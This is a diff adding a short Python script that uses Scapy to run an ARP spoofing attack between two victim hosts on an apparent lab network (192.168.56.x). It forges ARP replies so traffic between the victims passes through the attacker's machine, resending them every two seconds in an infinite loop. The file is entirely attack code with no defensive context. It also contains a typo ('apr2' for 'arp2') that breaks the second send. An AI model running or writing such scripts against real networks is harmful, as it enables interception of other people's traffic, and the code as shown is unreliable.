@@ -1,0 +1,33 @@
+from scapy.all import *
+import time
+
+#variables
+macAttacker = "08:00:27:D0:25:4B"
+ipAttacker = "192.168.56.103"
+
+macVictim1 = "08:00:27:B7:C4:AF"
+ipVictim1 = "192.168.56.101"
+
+macVictim2 = "08:00:27:CC:08:6F"
+ipVictim2 = "192.168.56.102"
+
+#set up
+arp1 = Ether() / ARP ()
+arp1[Ether].src = macAttacker
+arp1[ARP].hwsrc = macAttacker
+arp1[ARP].psrc = ipVictim2
+arp1[ARP].hwdst = macVictim1
+arp1[ARP].pdst = ipVictim1
+
+arp2 = Ether() / ARP ()
+arp2[Ether].src = macAttacker
+arp2[ARP].hwsrc = macAttacker
+arp2[ARP].psrc = ipVictim1
+arp2[ARP].hwdst = macVictim2
+arp2[ARP].pdst = ipVictim2
+
+#poison the arps
+while True:
+	sendp(arp1, iface="enp0s3")
+	sendp(apr2, iface="enp0s3")
+	time.sleep(2);
